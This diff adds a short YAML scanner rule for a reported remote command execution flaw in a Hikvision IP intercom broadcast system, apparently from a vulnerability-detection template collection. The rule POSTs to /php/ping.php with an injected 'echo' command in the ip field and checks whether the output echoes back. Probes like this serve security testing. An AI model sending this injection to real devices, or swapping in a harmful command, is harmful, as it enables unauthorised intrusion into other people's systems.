@@ -1,0 +1,16 @@
+name: HIKVISION-IP网络对讲广播系统-ping-RCE
+description: >
+  命令执行
+alwaysExecute: false
+matchCount: 1
+rules:   
+  - method: POST
+    path: /php/ping.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded   
+    body: >
+      jsondata[type]=3&jsondata[ip]=echo%20oday2024
+    expression:
+      status: 200
+      body_all:
+        - "oday2024"   
